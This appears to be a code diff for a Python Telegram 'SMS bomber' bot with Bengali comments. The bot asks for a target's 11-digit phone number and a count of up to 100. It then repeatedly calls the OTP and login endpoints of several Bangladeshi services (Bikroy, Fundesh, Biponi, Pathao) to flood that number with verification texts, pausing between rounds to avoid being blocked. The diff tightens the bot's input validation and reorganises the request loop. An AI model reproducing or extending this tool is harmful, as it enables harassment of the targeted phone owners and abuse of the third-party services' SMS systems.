@@ -11,11 +11,11 @@ CHANNEL_USERNAME = '@developer_of_maruf'
 
 bot = telebot.TeleBot(API_TOKEN)
 user_data = {}
+verified_users = set() # ভেরিফিকেশন মনে রাখার জন্য
 
-# ২. Render সচল রাখার জন্য Flask
 app = Flask('')
 @app.route('/')
-def home(): return "Power Bomber is Live!"
+def home(): return "Server is Running!"
 
 def run():
     app.run(host='0.0.0.0', port=8080)
@@ -30,18 +30,23 @@ def check_join(chat_id):
         return status in ['member', 'administrator', 'creator']
     except: return False
 
-# ৩. বোট কমান্ডস
+# ২. স্টার্ট কমান্ড ও ভেরিফিকেশন
 @bot.message_handler(commands=['start'])
 def welcome(message):
-    if check_join(message.chat.id):
-        bot.send_message(message.chat.id, "✅ **ভেরিফিকেশন সফল!**")
-        msg = bot.send_message(message.chat.id, "🚀 SMS পাঠাতে এখন নাম্বারটি দিন:")
+    chat_id = message.chat.id
+    if check_join(chat_id):
+        if chat_id not in verified_users:
+            bot.send_message(chat_id, "✅ **ভেরিফিকেশন সফল হয়েছে!**", parse_mode="Markdown")
+            verified_users.add(chat_id)
+            time.sleep(1)
+        
+        msg = bot.send_message(chat_id, "🎯 SMS পাঠাতে এখন টার্গেট নাম্বারটি দিন (১১ ডিজিট):")
         bot.register_next_step_handler(msg, get_number)
     else:
         markup = types.InlineKeyboardMarkup()
         markup.add(types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/developer_of_maruf"))
         markup.add(types.InlineKeyboardButton("✅ Verify Done", callback_data="verify_join"))
-        bot.send_message(message.chat.id, "❌ আগে জয়েন করুন!", reply_markup=markup)
+        bot.send_message(chat_id, "❌ আগে আমাদের চ্যানেলে জয়েন করুন!", reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: call.data == "verify_join")
 def verify_join(call):
@@ -51,42 +56,47 @@ def verify_join(call):
     else:
         bot.answer_callback_query(call.id, "❌ আপনি এখনো জয়েন হননি!", show_alert=True)
 
+# ৩. নাম্বার ভ্যালিডেশন (কঠিন নিয়ম)
 def get_number(message):
-    user_data[message.chat.id] = message.text
-    msg = bot.send_message(message.chat.id, "🔢 কতটি SMS পাঠাতে চান? (সর্বোচ্চ ১০০)")
+    num = message.text
+    if num == "/start":
+        welcome(message)
+        return
+    
+    if not num.isdigit() or len(num) != 11:
+        msg = bot.send_message(message.chat.id, "⚠️ ভুল নাম্বার! অবশ্যই ১১ ডিজিটের সঠিক নাম্বার দিন:")
+        bot.register_next_step_handler(msg, get_number)
+        return
+        
+    user_data[message.chat.id] = num
+    msg = bot.send_message(message.chat.id, "🔢 কতটি SMS পাঠাতে চান? (১-১০০):")
     bot.register_next_step_handler(msg, send_bomber)
 
-# ৪. মেইন বোম্বিং লজিক (একাধিক API সহ)
+# ৪. বোম্বিং প্রসেস (মাল্টিপল API)
 def send_bomber(message):
     try:
         amount = int(message.text)
         num = user_data[message.chat.id]
         if amount > 100: amount = 100 
         
-        bot.send_message(message.chat.id, f"🚀 {num} নাম্বারে {amount}টি SMS পাঠানো শুরু হচ্ছে...")
+        bot.send_message(message.chat.id, f"🚀 {num} নাম্বারে {amount}টি SMS পাঠানো হচ্ছে...")
         
         for i in range(amount):
             try:
-                # API 1: Bikroy
-                requests.get(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={num}", timeout=5)
+                # API লিস্ট (একাধিক সাইট থেকে রিকোয়েস্ট যাবে)
+                requests.get(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={num}", timeout=3)
+                requests.get(f"https://fundesh.com.bd/api/auth/send-otp?phone={num}", timeout=3)
+                requests.get(f"https://www.biponi.com/api/v1/login/otp?phone={num}", timeout=3)
+                requests.post("https://api.pathao.com/v1/auth/otp/send", data={"phone": num}, timeout=3)
                 
-                # API 2: Biponi
-                requests.get(f"https://www.biponi.com/api/v1/login/otp?phone={num}", timeout=5)
-                
-                # API 3: Fundesh
-                requests.get(f"https://fundesh.com.bd/api/auth/send-otp?phone={num}", timeout=5)
-                
-                # API 4: Pathao (Example POST Request)
-                requests.post("https://api.pathao.com/v1/auth/otp/send", data={"phone": num}, timeout=5)
-
-                # প্রতি রিকোয়েস্টের মাঝে ১ সেকেন্ড বিরতি যাতে ব্লক না করে
+                # ব্লক হওয়া এড়াতে ১ সেকেন্ড বিরতি
                 time.sleep(1) 
             except:
                 continue
                 
-        bot.send_message(message.chat.id, "✅ কাজ শেষ! আবার পাঠাতে /start দিন।")
+        bot.send_message(message.chat.id, "✅ কাজ শেষ! আবার করতে /start লিখুন।")
     except:
-        bot.send_message(message.chat.id, "❌ ভুল হয়েছে! শুধু সংখ্যা দিন।")
+        bot.send_message(message.chat.id, "❌ শুধু সংখ্যা লিখুন।")
 
 if __name__ == "__main__":
     keep_alive()
